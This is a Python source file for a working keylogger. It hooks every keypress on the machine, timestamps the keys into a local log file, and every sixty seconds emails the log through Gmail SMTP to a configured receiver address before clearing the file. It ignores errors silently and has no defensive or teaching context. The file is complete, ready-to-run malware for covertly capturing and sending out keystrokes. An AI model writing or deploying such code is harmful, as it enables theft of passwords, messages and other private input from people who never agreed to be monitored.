import sys
import os
import threading
import time
import keyboard
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

# --- Configuration Section ---
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_email_password"
RECEIVER_EMAIL = "receiver_email@gmail.com"

LOG_FILE = "keys.log"
SEND_INTERVAL = 60 

class ProfessionalKeylogger:
    def __init__(self):
        self.keys_log = []
        self.last_send_time = time.time()
        self.running = True

    def log_key(self, key):
        """Captures the pressed key and appends it to the log file."""
        try:
            if hasattr(key, 'name'):
                name = key.name
            else:
                name = str(key)
            
            timestamp = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {name}\n"
            self.keys_log.append(timestamp)
            
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(timestamp)
                
        except Exception:
            pass

    def send_email(self):
        """Sends the captured logs to the receiver's email address."""
        if not self.keys_log:
            return
        
        try:
            content = "".join(self.keys_log)
            subject = f"Keylogger Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = f"The following keys were captured:\n\n{content}"
            
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = RECEIVER_EMAIL
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, msg.as_string())
            server.quit()
            
            self.keys_log.clear()
            open(LOG_FILE, 'w').close()
            
        except Exception:
            pass

    def background_sender(self):
        """A daemon thread that periodically checks if it's time to send an email."""
        while self.running:
            current_time = time.time()
            if current_time - self.last_send_time >= SEND_INTERVAL:
                self.send_email()
                self.last_send_time = current_time
            time.sleep(1)

    def on_press(self, key):
        """Callback function for key press events."""
        self.log_key(key)

    def start(self):
        """Initializes and starts the keylogger threads."""
        # Start the background sender thread
        sender_thread = threading.Thread(target=self.background_sender, daemon=True)
        sender_thread.start()
        
        # Register the global hook for keyboard events
        keyboard.on_press(self.on_press)
        
        print("Keylogger started. Press Ctrl+Z to stop.")
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_keylogger()

    def stop_keylogger(self):
        """Stops the logging loop."""
        self.running = False
        print("Keylogger stopped.")

if __name__ == "__main__":
    keylogger = ProfessionalKeylogger()
    keylogger.start()